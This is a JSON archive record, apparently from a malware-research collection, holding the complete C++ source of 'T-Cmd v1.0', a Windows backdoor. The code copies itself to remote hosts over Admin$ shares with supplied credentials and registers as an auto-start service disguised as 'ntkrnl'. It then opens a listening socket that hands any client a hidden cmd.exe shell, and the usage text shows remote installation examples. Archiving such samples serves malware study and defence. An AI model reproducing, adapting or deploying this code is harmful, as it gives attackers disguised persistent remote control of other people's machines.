{
    "id": "df560213-01b7-4d1e-8495-870454b3b8df",
    "created_at": "2023-01-12T14:59:23.91323Z",
    "updated_at": "2025-03-27T02:05:42.947982Z",
    "deleted_at": null,
    "sha1_hash": "58df535cb6647905dfdfddd9d7dc1660ee13d8f6",
    "title": "2013-11-09 - T-cmd.cpp",
    "authors": "",
    "file_creation_date": "2022-07-18T18:24:23Z",
    "file_modification_date": "2022-07-18T18:24:23Z",
    "file_size": 872527,
    "plain_text": "# 2006-defconbot/T-cmd.cpp\n\n**github.com/crackeeer/2006-defconbot/blob/master/T-cmd.cpp**\n\ncrackeeer\n\n#include <windows.h>\n\n#include <stdio.h>\n\n#define BUFFER_SIZE 1024\n\ntypedef struct\n\n{\n\nHANDLE hPipe;\n\nSOCKET sClient;\n\n}SESSIONDATA,*PSESSIONDATA;\n\ntypedef struct PROCESSDATA\n\n{\n\nHANDLE hProcess;\n\nDWORD dwProcessId;\n\nstruct PROCESSDATA *next;\n\n}PROCESSDATA,*PPROCESSDATA;\n\n\n-----\n\nHANDLE hMutex;\n\nPPROCESSDATA lpProcessDataHead;\n\nPPROCESSDATA lpProcessDataEnd;\n\nSERVICE_STATUS ServiceStatus;\n\nSERVICE_STATUS_HANDLE ServiceStatusHandle;\n\nvoid WINAPI CmdStart(DWORD,LPTSTR *);\n\nvoid WINAPI CmdControl(DWORD);\n\nDWORD WINAPI CmdService(LPVOID);\n\nDWORD WINAPI CmdShell(LPVOID);\n\nDWORD WINAPI ReadShell(LPVOID);\n\nDWORD WINAPI WriteShell(LPVOID);\n\nBOOL ConnectRemote(BOOL,char *,char *,char *);\n\nvoid InstallCmdService(char *);\n\nvoid RemoveCmdService(char *);\n\nvoid Start(void);\n\nvoid Usage(void);\n\nint main(int argc,char *argv[])\n\n{\n\nSERVICE_TABLE_ENTRY DispatchTable[] =\n\n{\n\n{\"ntkrnl\",CmdStart},\n\n{NULL,NULL }\n\n};\n\nif(argc==5)\n\n{\n\nif(ConnectRemote(TRUE,argv[2],argv[3],argv[4])==FALSE)\n\n{\n\nreturn -1;\n\n\n-----\n\n}\n\nif(!stricmp(argv[1],\"-install\"))\n\n{\n\nInstallCmdService(argv[2]);\n\n}\n\nelse if(!stricmp(argv[1],\"-remove\"))\n\n{\n\nRemoveCmdService(argv[2]);\n\n}\n\nif(ConnectRemote(FALSE,argv[2],argv[3],argv[4])==FALSE)\n\n{\n\nreturn -1;\n\n}\n\nreturn 0;\n\n}\n\nelse if(argc==2)\n\n{\n\nif(!stricmp(argv[1],\"-install\"))\n\n{\n\nInstallCmdService(NULL);\n\n}\n\nelse if(!stricmp(argv[1],\"-remove\"))\n\n{\n\nRemoveCmdService(NULL);\n\n}\n\nelse\n\n{\n\nStart();\n\nUsage();\n\n}\n\n\n-----\n\nreturn 0;\n\n}\n\nStartServiceCtrlDispatcher(DispatchTable);\n\nreturn 0;\n\n}\n\nvoid WINAPI CmdStart(DWORD dwArgc,LPTSTR *lpArgv)\n\n{\n\nHANDLE hThread;\n\nServiceStatus.dwServiceType = SERVICE_WIN32;\n\nServiceStatus.dwCurrentState = SERVICE_START_PENDING;\n\nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP\n\n| SERVICE_ACCEPT_PAUSE_CONTINUE;\n\nServiceStatus.dwServiceSpecificExitCode = 0;\n\nServiceStatus.dwWin32ExitCode = 0;\n\nServiceStatus.dwCheckPoint = 0;\n\nServiceStatus.dwWaitHint = 0;\n\nServiceStatusHandle=RegisterServiceCtrlHandler(\"ntkrnl\",CmdControl);\n\nif(ServiceStatusHandle==0)\n\n{\n\nOutputDebugString(\"RegisterServiceCtrlHandler Error !\\n\");\n\nreturn ;\n\n}\n\nServiceStatus.dwCurrentState = SERVICE_RUNNING;\n\nServiceStatus.dwCheckPoint = 0;\n\nServiceStatus.dwWaitHint = 0;\n\nif(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)\n\n{\n\n\n-----\n\nOutputDebugString(\"SetServiceStatus in CmdStart Error !\\n\");\n\nreturn ;\n\n}\n\nhThread=CreateThread(NULL,0,CmdService,NULL,0,NULL);\n\nif(hThread==NULL)\n\n{\n\nOutputDebugString(\"CreateThread in CmdStart Error !\\n\");\n\n}\n\nreturn ;\n\n}\n\nvoid WINAPI CmdControl(DWORD dwCode)\n\n{\n\nswitch(dwCode)\n\n{\n\ncase SERVICE_CONTROL_PAUSE:\n\nServiceStatus.dwCurrentState = SERVICE_PAUSED;\n\nbreak;\n\ncase SERVICE_CONTROL_CONTINUE:\n\nServiceStatus.dwCurrentState = SERVICE_RUNNING;\n\nbreak;\n\ncase SERVICE_CONTROL_STOP:\n\nWaitForSingleObject(hMutex,INFINITE);\n\nwhile(lpProcessDataHead!=NULL)\n\n{\n\nTerminateProcess(lpProcessDataHead->hProcess,1);\n\nif(lpProcessDataHead->next!=NULL)\n\n{\n\nlpProcessDataHead=lpProcessDataHead->next;\n\n\n-----\n\n}\n\nelse\n\n{\n\nlpProcessDataHead=NULL;\n\n}\n\n}\n\nServiceStatus.dwCurrentState = SERVICE_STOPPED;\n\nServiceStatus.dwWin32ExitCode = 0;\n\nServiceStatus.dwCheckPoint = 0;\n\nServiceStatus.dwWaitHint = 0;\n\nif(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)\n\n{\n\nOutputDebugString(\"SetServiceStatus in CmdControl in Switch Error !\\n\");\n\n}\n\nReleaseMutex(hMutex);\n\nCloseHandle(hMutex);\n\nreturn ;\n\ncase SERVICE_CONTROL_INTERROGATE:\n\nbreak;\n\ndefault:\n\nbreak;\n\n}\n\nif(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)\n\n{\n\nOutputDebugString(\"SetServiceStatus in CmdControl out Switch Error !\\n\");\n\n}\n\nreturn ;\n\n}\n\n\n-----\n\nDWORD WINAPI CmdService(LPVOID lpParam)\n\n{\n\nWSADATA wsa;\n\nSOCKET sServer;\n\nSOCKET sClient;\n\nHANDLE hThread;\n\nstruct sockaddr_in sin;\n\nWSAStartup(MAKEWORD(2,2),&wsa);\n\nsServer = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);\n\nif(sServer==INVALID_SOCKET)\n\n{\n\nOutputDebugString(\"Socket Error !\\n\");\n\nreturn -1;\n\n}\n\nsin.sin_family = AF_INET;\n\nsin.sin_port = htons(20540);\n\nsin.sin_addr.S_un.S_addr = INADDR_ANY;\n\nif(bind(sServer,(const struct sockaddr *)&sin,sizeof(sin))==SOCKET_ERROR)\n\n{\n\nOutputDebugString(\"Bind Error !\\n\");\n\nreturn -1;\n\n}\n\nif(listen(sServer,5)==SOCKET_ERROR)\n\n{\n\nOutputDebugString(\"Listen Error !\\n\");\n\nreturn -1;\n\n}\n\nhMutex=CreateMutex(NULL,FALSE,NULL);\n\nif(hMutex==NULL)\n\n\n-----\n\n{\n\nOutputDebugString(\"Create Mutex Error !\\n\");\n\n}\n\nlpProcessDataHead=NULL;\n\nlpProcessDataEnd=NULL;\n\nwhile(1)\n\n{\n\nsClient=accept(sServer,NULL,NULL);\n\nhThread=CreateThread(NULL,0,CmdShell,(LPVOID)&sClient,0,NULL);\n\nif(hThread==NULL)\n\n{\n\nOutputDebugString(\"CreateThread of CmdShell Error !\\n\");\n\nbreak;\n\n}\n\nSleep(1000);\n\n}\n\nWSACleanup();\n\nreturn 0;\n\n}\n\nDWORD WINAPI CmdShell(LPVOID lpParam)\n\n{\n\nSOCKET sClient=*(SOCKET *)lpParam;\n\nHANDLE hWritePipe,hReadPipe,hWriteShell,hReadShell;\n\nHANDLE hThread[3];\n\nDWORD dwReavThreadId,dwSendThreadId;\n\nDWORD dwProcessId;\n\nDWORD dwResult;\n\nSTARTUPINFO lpStartupInfo;\n\nSESSIONDATA sdWrite,sdRead;\n\n\n-----\n\nPROCESS_INFORMATION lpProcessInfo;\n\nSECURITY_ATTRIBUTES saPipe;\n\nPPROCESSDATA lpProcessDataLast;\n\nPPROCESSDATA lpProcessDataNow;\n\nchar lpImagePath[MAX_PATH];\n\nsaPipe.nLength = sizeof(saPipe);\n\nsaPipe.bInheritHandle = TRUE;\n\nsaPipe.lpSecurityDescriptor = NULL;\n\nif(CreatePipe(&hReadPipe,&hReadShell,&saPipe,0)==0)\n\n{\n\nOutputDebugString(\"CreatePipe for ReadPipe Error !\\n\");\n\nreturn -1;\n\n}\n\nif(CreatePipe(&hWriteShell,&hWritePipe,&saPipe,0)==0)\n\n{\n\nOutputDebugString(\"CreatePipe for WritePipe Error !\\n\");\n\nreturn -1;\n\n}\n\nGetStartupInfo(&lpStartupInfo);\n\nlpStartupInfo.cb = sizeof(lpStartupInfo);\n\nlpStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\n\nlpStartupInfo.hStdInput = hWriteShell;\n\nlpStartupInfo.hStdOutput = hReadShell;\n\nlpStartupInfo.hStdError = hReadShell;\n\nlpStartupInfo.wShowWindow = SW_HIDE;\n\nGetSystemDirectory(lpImagePath,MAX_PATH);\n\nstrcat(lpImagePath,(\"\\\\cmd.exe\"));\n\nWaitForSingleObject(hMutex,INFINITE);\n\n\n-----\n\nif(CreateProcess(lpImagePath,NULL,NULL,NULL,TRUE,0,NULL,NULL,&lpStartupInfo,&lpProcessInfo)==0)\n\n{\n\nOutputDebugString(\"CreateProcess Error !\\n\");\n\nreturn -1;\n\n}\n\nlpProcessDataNow=(PPROCESSDATA)malloc(sizeof(PROCESSDATA));\n\nlpProcessDataNow->hProcess=lpProcessInfo.hProcess;\n\nlpProcessDataNow->dwProcessId=lpProcessInfo.dwProcessId;\n\nlpProcessDataNow->next=NULL;\n\nif((lpProcessDataHead==NULL) || (lpProcessDataEnd==NULL))\n\n{\n\nlpProcessDataHead=lpProcessDataNow;\n\nlpProcessDataEnd=lpProcessDataNow;\n\n}\n\nelse\n\n{\n\nlpProcessDataEnd->next=lpProcessDataNow;\n\nlpProcessDataEnd=lpProcessDataNow;\n\n}\n\nhThread[0]=lpProcessInfo.hProcess;\n\ndwProcessId=lpProcessInfo.dwProcessId;\n\nCloseHandle(lpProcessInfo.hThread);\n\nReleaseMutex(hMutex);\n\nCloseHandle(hWriteShell);\n\nCloseHandle(hReadShell);\n\nsdRead.hPipe = hReadPipe;\n\nsdRead.sClient = sClient;\n\nhThread[1] = CreateThread(NULL,0,ReadShell,(LPVOID*)&sdRead,0,&dwSendThreadId);\n\nif(hThread[1]==NULL)\n\n\n-----\n\n{\n\nOutputDebugString(\"CreateThread of ReadShell(Send) Error !\\n\");\n\nreturn -1;\n\n}\n\nsdWrite.hPipe = hWritePipe;\n\nsdWrite.sClient = sClient;\n\nhThread[2] = CreateThread(NULL,0,WriteShell,(LPVOID *)&sdWrite,0,&dwReavThreadId);\n\nif(hThread[2]==NULL)\n\n{\n\nOutputDebugString(\"CreateThread for WriteShell(Recv) Error !\\n\");\n\nreturn -1;\n\n}\n\ndwResult=WaitForMultipleObjects(3,hThread,FALSE,INFINITE);\n\nif((dwResult>=WAIT_OBJECT_0) && (dwResult<=(WAIT_OBJECT_0 + 2)))\n\n{\n\ndwResult-=WAIT_OBJECT_0;\n\nif(dwResult!=0)\n\n{\n\nTerminateProcess(hThread[0],1);\n\n}\n\nCloseHandle(hThread[(dwResult+1)%3]);\n\nCloseHandle(hThread[(dwResult+2)%3]);\n\n}\n\nCloseHandle(hWritePipe);\n\nCloseHandle(hReadPipe);\n\nWaitForSingleObject(hMutex,INFINITE);\n\nlpProcessDataLast=NULL;\n\nlpProcessDataNow=lpProcessDataHead;\n\nwhile((lpProcessDataNow->next!=NULL) && (lpProcessDataNow->dwProcessId!=dwProcessId))\n\n\n-----\n\n{\n\nlpProcessDataLast=lpProcessDataNow;\n\nlpProcessDataNow=lpProcessDataNow->next;\n\n}\n\nif(lpProcessDataNow==lpProcessDataEnd)\n\n{\n\nif(lpProcessDataNow->dwProcessId!=dwProcessId)\n\n{\n\nOutputDebugString(\"No Found the Process Handle !\\n\");\n\n}\n\nelse\n\n{\n\nif(lpProcessDataNow==lpProcessDataHead)\n\n{\n\nlpProcessDataHead=NULL;\n\nlpProcessDataEnd=NULL;\n\n}\n\nelse\n\n{\n\nlpProcessDataEnd=lpProcessDataLast;\n\n}\n\n}\n\n}\n\nelse\n\n{\n\nif(lpProcessDataNow==lpProcessDataHead)\n\n{\n\nlpProcessDataHead=lpProcessDataNow->next;\n\n}\n\nelse\n\n{\n\n\n-----\n\nlpProcessDataLast->next=lpProcessDataNow->next;\n\n}\n\n}\n\nReleaseMutex(hMutex);\n\nreturn 0;\n\n}\n\nDWORD WINAPI ReadShell(LPVOID lpParam)\n\n{\n\nSESSIONDATA sdRead=*(PSESSIONDATA)lpParam;\n\nDWORD dwBufferRead,dwBufferNow,dwBuffer2Send;\n\nchar szBuffer[BUFFER_SIZE];\n\nchar szBuffer2Send[BUFFER_SIZE+32];\n\nchar PrevChar;\n\nchar szStartMessage[256]=\"\\r\\n\\r\\n\\t\\t---[ T-Cmd v1.0 beta, by TOo2y ]---\\r\\n\\t\\t---[ E-mail:\nTOo2y@safechina.net ]---\\r\\n\\t\\t---[ HomePage: www.safechina.net ]---\\r\\n\\t\\t---[ Date: 02-05-2003 ]---\\r\\n\\n\";\n\nchar szHelpMessage[256]=\"\\r\\nEscape Character is 'CTRL+]'\\r\\n\\n\";\n\nsend(sdRead.sClient,szStartMessage,256,0);\n\nsend(sdRead.sClient,szHelpMessage,256,0);\n\nwhile(PeekNamedPipe(sdRead.hPipe,szBuffer,BUFFER_SIZE,&dwBufferRead,NULL,NULL))\n\n{\n\nif(dwBufferRead>0)\n\n{\n\nReadFile(sdRead.hPipe,szBuffer,BUFFER_SIZE,&dwBufferRead,NULL);\n\n}\n\nelse\n\n{\n\nSleep(10);\n\ncontinue;\n\n}\n\n\n-----\n\nfor(dwBufferNow=0,dwBuffer2Send=0;dwBufferNow<dwBufferRead;dwBufferNow++,dwBuffer2Send++)\n\n{\n\nif((szBuffer[dwBufferNow]=='\\n') && (PrevChar!='\\r'))\n\n{\n\nszBuffer[dwBuffer2Send++]='\\r';\n\n}\n\nPrevChar=szBuffer[dwBufferNow];\n\nszBuffer2Send[dwBuffer2Send]=szBuffer[dwBufferNow];\n\n}\n\nif(send(sdRead.sClient,szBuffer2Send,dwBuffer2Send,0)==SOCKET_ERROR)\n\n{\n\nOutputDebugString(\"Send in ReadShell Error !\\n\");\n\nbreak;\n\n}\n\nSleep(5);\n\n}\n\nshutdown(sdRead.sClient,0x02);\n\nclosesocket(sdRead.sClient);\n\nreturn 0;\n\n}\n\nDWORD WINAPI WriteShell(LPVOID lpParam)\n\n{\n\nSESSIONDATA sdWrite=*(PSESSIONDATA)lpParam;\n\nDWORD dwBuffer2Write,dwBufferWritten;\n\nchar szBuffer[1];\n\nchar szBuffer2Write[BUFFER_SIZE];\n\ndwBuffer2Write=0;\n\nwhile(recv(sdWrite.sClient,szBuffer,1,0)!=0)\n\n{\n\n\n-----\n\nszBuffer2Write[dwBuffer2Write++]=szBuffer[0];\n\nif(strnicmp(szBuffer2Write,\"exit\\r\\n\",6)==0)\n\n{\n\nshutdown(sdWrite.sClient,0x02);\n\nclosesocket(sdWrite.sClient);\n\nreturn 0;\n\n}\n\nif(szBuffer[0]=='\\n')\n\n{\n\nif(WriteFile(sdWrite.hPipe,szBuffer2Write,dwBuffer2Write,&dwBufferWritten,NULL)==0)\n\n{\n\nOutputDebugString(\"WriteFile in WriteShell(Recv) Error !\\n\");\n\nbreak;\n\n}\n\ndwBuffer2Write=0;\n\n}\n\nSleep(10);\n\n}\n\nshutdown(sdWrite.sClient,0x02);\n\nclosesocket(sdWrite.sClient);\n\nreturn 0;\n\n}\n\nBOOL ConnectRemote(BOOL bConnect,char *lpHost,char *lpUserName,char *lpPassword)\n\n{\n\nchar lpIPC[256];\n\nDWORD dwErrorCode;\n\nNETRESOURCE NetResource;\n\nsprintf(lpIPC,\"\\\\\\\\%s\\\\ipc$\",lpHost);\n\n\n-----\n\nNetResource.lpLocalName = NULL;\n\nNetResource.lpRemoteName = lpIPC;\n\nNetResource.dwType = RESOURCETYPE_ANY;\n\nNetResource.lpProvider = NULL;\n\nif(!stricmp(lpPassword,\"NULL\"))\n\n{\n\nlpPassword=NULL;\n\n}\n\nif(bConnect)\n\n{\n\nprintf(\"Now Connecting ...... \");\n\nwhile(1)\n\n{\n\ndwErrorCode=WNetAddConnection2(&NetResource,lpPassword,lpUserName,CONNECT_INTERACTIVE);\n\nif((dwErrorCode==ERROR_ALREADY_ASSIGNED) ||\n(dwErrorCode==ERROR_DEVICE_ALREADY_REMEMBERED))\n\n{\n\nWNetCancelConnection2(lpIPC,CONNECT_UPDATE_PROFILE,TRUE);\n\n}\n\nelse if(dwErrorCode==NO_ERROR)\n\n{\n\nprintf(\"Success !\\n\");\n\nbreak;\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\nreturn FALSE;\n\n}\n\nSleep(10);\n\n\n-----\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"Now Disconnecting ... \");\n\ndwErrorCode=WNetCancelConnection2(lpIPC,CONNECT_UPDATE_PROFILE,TRUE);\n\nif(dwErrorCode==NO_ERROR)\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\nreturn FALSE;\n\n}\n\n}\n\nreturn TRUE;\n\n}\n\nvoid InstallCmdService(char *lpHost)\n\n{\n\nSC_HANDLE schSCManager;\n\nSC_HANDLE schService;\n\nchar lpCurrentPath[MAX_PATH];\n\nchar lpImagePath[MAX_PATH];\n\nchar *lpHostName;\n\nWIN32_FIND_DATA FileData;\n\nHANDLE hSearch;\n\nDWORD dwErrorCode;\n\nSERVICE_STATUS InstallServiceStatus;\n\n\n-----\n\nif(lpHost==NULL)\n\n{\n\nGetSystemDirectory(lpImagePath,MAX_PATH);\n\nstrcat(lpImagePath,\"\\\\ntkrnl.exe\");\n\nlpHostName=NULL;\n\n}\n\nelse\n\n{\n\nsprintf(lpImagePath,\"\\\\\\\\%s\\\\Admin$\\\\system32\\\\ntkrnl.exe\",lpHost);\n\nlpHostName=(char *)malloc(256);\n\nsprintf(lpHostName,\"\\\\\\\\%s\",lpHost);\n\n}\n\nprintf(\"Transmitting File ... \");\n\nhSearch=FindFirstFile(lpImagePath,&FileData);\n\nif(hSearch==INVALID_HANDLE_VALUE)\n\n{\n\nGetModuleFileName(NULL,lpCurrentPath,MAX_PATH);\n\nif(CopyFile(lpCurrentPath,lpImagePath,FALSE)==0)\n\n{\n\ndwErrorCode=GetLastError();\n\nif(dwErrorCode==5)\n\n{\n\nprintf(\"Failure ... Access is Denied !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\nreturn ;\n\n}\n\n\n-----\n\nelse\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"already Exists !\\n\");\n\nFindClose(hSearch);\n\n}\n\nschSCManager=OpenSCManager(lpHostName,NULL,SC_MANAGER_ALL_ACCESS);\n\nif(schSCManager==NULL)\n\n{\n\nprintf(\"Open Service Control Manager Database Failure !\\n\");\n\nreturn ;\n\n}\n\nprintf(\"Creating Service .... \");\n\nschService=CreateService(schSCManager,\"ntkrnl\",\"ntkrnl\",SERVICE_ALL_ACCESS,\n\nSERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,\n\nSERVICE_ERROR_IGNORE,\"ntkrnl.exe\",NULL,NULL,NULL,NULL,NULL);\n\nif(schService==NULL)\n\n{\n\ndwErrorCode=GetLastError();\n\nif(dwErrorCode!=ERROR_SERVICE_EXISTS)\n\n{\n\nprintf(\"Failure !\\n\");\n\nCloseServiceHandle(schSCManager);\n\nreturn ;\n\n}\n\nelse\n\n\n-----\n\n{\n\nprintf(\"already Exists !\\n\");\n\nschService=OpenService(schSCManager,\"ntkrnl\",SERVICE_START);\n\nif(schService==NULL)\n\n{\n\nprintf(\"Opening Service .... Failure !\\n\");\n\nCloseServiceHandle(schSCManager);\n\nreturn ;\n\n}\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\nprintf(\"Starting Service .... \");\n\nif(StartService(schService,0,NULL)==0)\n\n{\n\ndwErrorCode=GetLastError();\n\nif(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)\n\n{\n\nprintf(\"already Running !\\n\");\n\nCloseServiceHandle(schSCManager);\n\nCloseServiceHandle(schService);\n\nreturn ;\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"Pending ... \");\n\n\n-----\n\n}\n\nwhile(QueryServiceStatus(schService,&InstallServiceStatus)!=0)\n\n{\n\nif(InstallServiceStatus.dwCurrentState==SERVICE_START_PENDING)\n\n{\n\nSleep(100);\n\n}\n\nelse\n\n{\n\nbreak;\n\n}\n\n}\n\nif(InstallServiceStatus.dwCurrentState!=SERVICE_RUNNING)\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\nCloseServiceHandle(schSCManager);\n\nCloseServiceHandle(schService);\n\nreturn ;\n\n}\n\nvoid RemoveCmdService(char *lpHost)\n\n{\n\nSC_HANDLE schSCManager;\n\nSC_HANDLE schService;\n\nchar lpImagePath[MAX_PATH];\n\n\n-----\n\nchar *lpHostName;\n\nWIN32_FIND_DATA FileData;\n\nSERVICE_STATUS RemoveServiceStatus;\n\nHANDLE hSearch;\n\nDWORD dwErrorCode;\n\nif(lpHost==NULL)\n\n{\n\nGetSystemDirectory(lpImagePath,MAX_PATH);\n\nstrcat(lpImagePath,\"\\\\ntkrnl.exe\");\n\nlpHostName=NULL;\n\n}\n\nelse\n\n{\n\nsprintf(lpImagePath,\"\\\\\\\\%s\\\\Admin$\\\\system32\\\\ntkrnl.exe\",lpHost);\n\nlpHostName=(char *)malloc(MAX_PATH);\n\nsprintf(lpHostName,\"\\\\\\\\%s\",lpHost);\n\n}\n\nschSCManager=OpenSCManager(lpHostName,NULL,SC_MANAGER_ALL_ACCESS);\n\nif(schSCManager==NULL)\n\n{\n\nprintf(\"Opening SCM ......... \");\n\ndwErrorCode=GetLastError();\n\nif(dwErrorCode!=5)\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Failuer ... Access is Denied !\\n\");\n\n}\n\n\n-----\n\nreturn ;\n\n}\n\nschService=OpenService(schSCManager,\"ntkrnl\",SERVICE_ALL_ACCESS);\n\nif(schService==NULL)\n\n{\n\nprintf(\"Opening Service ..... \");\n\ndwErrorCode=GetLastError();\n\nif(dwErrorCode==1060)\n\n{\n\nprintf(\"no Exists !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\nCloseServiceHandle(schSCManager);\n\n}\n\nelse\n\n{\n\nprintf(\"Stopping Service .... \");\n\nif(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)\n\n{\n\nif(RemoveServiceStatus.dwCurrentState==SERVICE_STOPPED)\n\n{\n\nprintf(\"already Stopped !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Pending ... \");\n\nif(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)\n\n\n-----\n\n{\n\nwhile(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)\n\n{\n\nSleep(10);\n\nQueryServiceStatus(schService,&RemoveServiceStatus);\n\n}\n\nif(RemoveServiceStatus.dwCurrentState==SERVICE_STOPPED)\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\n}\n\n}\n\nelse\n\n{\n\nprintf(\"Query Failure !\\n\");\n\n}\n\nprintf(\"Removing Service .... \");\n\nif(DeleteService(schService)==0)\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\n\n-----\n\nelse\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\n}\n\nCloseServiceHandle(schSCManager);\n\nCloseServiceHandle(schService);\n\nprintf(\"Removing File ....... \");\n\nSleep(1500);\n\nhSearch=FindFirstFile(lpImagePath,&FileData);\n\nif(hSearch==INVALID_HANDLE_VALUE)\n\n{\n\nprintf(\"no Exists !\\n\");\n\n}\n\nelse\n\n{\n\nif(DeleteFile(lpImagePath)==0)\n\n{\n\nprintf(\"Failure !\\n\");\n\n}\n\nelse\n\n{\n\nprintf(\"Success !\\n\");\n\n}\n\nFindClose(hSearch);\n\n}\n\nreturn ;\n\n}\n\nvoid Start()\n\n\n-----\n\n{\n\nprintf(\"\\n\");\n\nprintf(\"\\t\\t---[ T-Cmd v1.0 beta, by TOo2y ]---\\n\");\n\nprintf(\"\\t\\t---[ E-mail: TOo2y@safechina.net ]---\\n\");\n\nprintf(\"\\t\\t---[ HomePage: www.safechina.net ]---\\n\");\n\nprintf(\"\\t\\t---[ Date: 02-05-2003 ]---\\n\\n\");\n\nreturn ;\n\n}\n\nvoid Usage()\n\n{\n\nprintf(\"Attention:\\n\");\n\nprintf(\" Be careful with this software, Good luck !\\n\\n\");\n\nprintf(\"Usage Show:\\n\");\n\nprintf(\" T-Cmd -Help\\n\");\n\nprintf(\" T-Cmd -Install [RemoteHost] [Account] [Password]\\n\");\n\nprintf(\" T-Cmd -Remove [RemoteHost] [Account] [Password]\\n\\n\");\n\nprintf(\"Example:\\n\");\n\nprintf(\" T-Cmd -Install (Install in the localhost)\\n\");\n\nprintf(\" T-Cmd -Remove (Remove in the localhost)\\n\");\n\nprintf(\" T-Cmd -Install 192.168.0.1 TOo2y 123456 (Install in 192.168.0.1)\\n\");\n\nprintf(\" T-Cmd -Remove 192.168.0.1 TOo2y 123456 (Remove in 192.168.0.1)\\n\");\n\nprintf(\" T-Cmd -Install 192.168.0.2 TOo2y NULL (NULL instead of no password)\\n\\n\");\n\nreturn ;\n\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-11-09 - T-cmd.cpp.pdf"
    ],
    "report_names": [
        "2013-11-09 - T-cmd.cpp.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535563,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1658168663,
    "ts_modification_date": 1658168663,
    "files": {
        "pdf": "https://archive.orkl.eu/58df535cb6647905dfdfddd9d7dc1660ee13d8f6.pdf",
        "text": "https://archive.orkl.eu/58df535cb6647905dfdfddd9d7dc1660ee13d8f6.txt",
        "img": "https://archive.orkl.eu/58df535cb6647905dfdfddd9d7dc1660ee13d8f6.jpg"
    }
}